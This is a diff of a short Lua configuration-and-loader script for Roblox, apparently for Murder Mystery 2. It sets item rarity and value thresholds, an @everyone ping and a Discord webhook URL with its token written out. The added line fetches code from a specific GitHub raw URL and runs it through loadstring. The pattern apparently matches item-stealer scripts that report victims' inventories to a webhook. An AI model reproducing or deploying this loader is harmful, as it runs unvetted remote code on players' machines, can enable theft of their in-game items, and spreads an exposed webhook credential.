@@ -3,4 +3,4 @@ _G.min_rarity = "Common"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1404570425023008890/-6k5d0FwMM5PlytVN2JWWraNFEofesmJ6j25R8VZldWnhdpD2qLUzSHVUsl-t4pJc02m" -- change to your webhook
-loadstring(game:HttpGet("your link"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()
